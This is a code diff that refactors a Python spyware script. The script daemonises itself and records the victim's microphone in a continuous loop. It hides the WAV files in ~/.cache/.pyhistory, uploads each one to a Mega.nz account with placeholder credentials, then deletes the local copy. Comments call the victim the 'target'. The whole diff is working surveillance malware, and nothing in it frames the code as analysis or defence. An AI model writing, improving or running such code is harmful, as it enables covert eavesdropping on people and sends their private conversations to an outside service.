@@ -4,23 +4,27 @@
 #######################
   
 from time import ctime
-from mega import Mega
-from requests import get
 from sys import implementation
-from speech_recognition import Recognizer, Microphone
 from os import environ, path, mkdir, remove, fork, _exit, EX_OK
 from concurrent.futures import ThreadPoolExecutor as TPPE
 
-
 class Upload(object):
     def __init__(self):
-        self.up         = Mega()
         self.user       = 'Your Email Address' # Your Email in Mega.nz
         self.password   = 'Your Password' # Your Password in Mega.nz
-    
+        self.Error      = lambda lib: ImportError(f"Please install \
+        {lib} or write\npython3 -m pip install -r requirements.txt ") # Error Import Models
+            
     def LoginAndUploadFileTarget(self, file):
         try:
-            m_login = self.up.login(
+            from mega import Mega
+            up = Mega()
+        except ImportError:
+            raise self.Error("mega.py")
+            exit(0)
+
+        try:
+            m_login = up.login(
                 email=self.user,
                 password=self.password
             )
@@ -30,38 +34,44 @@ class Upload(object):
         except Exception as e:
             return None
 
-class Daemon:
-    def daemon(func):
-        def wrapper(*args, **kwargs):
-            if fork(): return
-            func(*args, **kwargs)
-            _exit(EX_OK)
-        return wrapper
 
-
-class MicrophoneListing(object):
+class MicrophoneListing(Upload):
     """
-    Creates a new ``Microphone`` instance, which represents a physical microphone on the computer. Subclass of ``AudioSource``.
-    This will throw an ``AttributeError`` if you don't have PyAudio 0.2.11 or later installed.
-    If ``device_index`` is unspecified or ``None``, the default microphone is used as the audio source. Otherwise, ``device_index`` should be the index of the device to use for audio input.
-    A device index is an integer between 0 and ``pyaudio.get_device_count() - 1`` (assume we have used ``import pyaudio`` beforehand) inclusive. It represents an audio device such as a microphone or speaker. See the `PyAudio documentation <http://people.csail.mit.edu/hubert/pyaudio/docs/>`__ for more details.
-    The microphone audio is recorded in chunks of ``chunk_size`` samples, at a rate of ``sample_rate`` samples per second (Hertz). If not specified, the value of ``sample_rate`` is determined automatically from the system's microphone settings.
-    Higher ``sample_rate`` values result in better audio quality, but also more bandwidth (and therefore, slower recognition). Additionally, some CPUs, such as those in older Raspberry Pi models, can't keep up if this value is too high.
-    Higher ``chunk_size`` values help avoid triggering on rapidly changing ambient noise, but also makes detection less sensitive. This value, generally, should be left at its default.
+    Creates a new ``Microphone`` instance, which represents a physical microphone
+    on the computer. Subclass of ``AudioSource``.
+    This will throw an ``AttributeError`` 
+    if you don't have PyAudio 0.2.11 or later installed.
+    If ``device_index`` is unspecified or ``None``, the default microphone is 
+    used as the audio source. Otherwise, ``device_index`` should be the index of 
+    the device to use for audio input.
     """
     def __init__(self):
-        """
-        Creates a new ``Recognizer`` instance, which represents a collection of speech recognition functionality.
-        """
-        self.rc = Recognizer()
-        self.mc = Microphone() 
-        self.up = Upload() # Upload in Mega.nz
-        # self.tp = TPPE()  # ProcessPoolExecutor ``threading``
-        
-        # if the target connect in internet 
-        try: get('https://www.google.com')
-        except Exception: exit()
+        try:
+            """
+            Creates a new ``Recognizer`` instance, which represents a collection of speech recognition functionality.
+            """
 
+            from speech_recognition import Recognizer, Microphone
+            self.rc = Recognizer()
+            self.mc = Microphone() # Creates a new Microphone
+        except ImportError:
+            raise self.Error("SpeechRecognition")
+            exit(0)
+
+        try:
+            from requests import get
+
+            # if the target connect in internet 
+            try: get('https://www.google.com')
+            except Exception: exit(0)
+                
+        except ImportError:
+            raise self.Error("requests")
+            exit(0)
+        
+        # Number Packet
+        self.cou= int()
+        
     def listing(self):
         """
         Records a single phrase from source (an AudioSource instance) into an AudioData instance, which it returns.
@@ -77,7 +87,6 @@ class MicrophoneListing(object):
                 source,
                 timeout=50
             )
-            
             return audio
     
     def processing(self, *args, **kwargs):
@@ -102,7 +111,7 @@ class MicrophoneListing(object):
             try_save = self.save(packet)
             if try_save:
                 # Step[2] : Upload packet 
-                try_upload = self.up.LoginAndUploadFileTarget(try_save)
+                try_upload = self.LoginAndUploadFileTarget(try_save)
                 
                 if try_upload:
                     # Step[3] : Delete packet  
@@ -120,22 +129,20 @@ class MicrophoneListing(object):
                 worker processes will be created as the machine has processors.
         """
         data, *_ = args
-        with TPPE() as obj2:  # ProcessPoolExecutor() --> obj2
+        with TPPE() as obj2:  # ThreadPoolExecutor() --> obj2
             rSet = obj2.submit(self.processing, data)
         
 
     def save(self, *args, **kwargs):
-        print(f"{R}save{N}")
-
         """Save file wav in pc target"""
         packet, *_ = args
         
         try:
-            # Ex1 -> /{DIRHOME}/.cache/.pyhistory 
+            # -> /{DIRHOME}/.cache/.pyhistory 
             name_path       = path.join(environ.get('HOME'), '.cache', '.pyhistory')
-            # Ex2 -> {NameSystem}-{TimeNow}.wav
-            name_file       = f'{implementation._multiarch}-{ctime().split()[-2]}'
-            # Ex3 -> /{DIRHOME}/.cache/.pyhistory/{NameSystem}-{TimeNow}.wav
+            # -> {NameSystem}-{TimeNow}.wav
+            name_file       = f'{self.cou}-{implementation._multiarch}-{ctime().split()[-2]}'
+            # -> /{DIRHOME}/.cache/.pyhistory/{Num}-{NameSystem}-{TimeNow}.wav
             name_end_target = path.join(name_path, name_file)
             
             if not path.isdir(name_path): mkdir(name_path)
@@ -158,8 +165,18 @@ class MicrophoneListing(object):
         Loop All Time for ``listing`` in while   
         """
         while True:
+            self.cou += 1
             packet = self.listing()
             self.threading(packet)
+
+
+class Daemon:
+    def daemon(func):
+        def wrapper(*args, **kwargs):
+            if fork(): return
+            func(*args, **kwargs)
+            _exit(EX_OK)
+        return wrapper
 
 
 @Daemon.daemon
@@ -168,6 +185,6 @@ def main():
     try: obj.main()
     except Exception: exit()
 
-
 if __name__ == "__main__":
     main()
+    # [+] Listing...
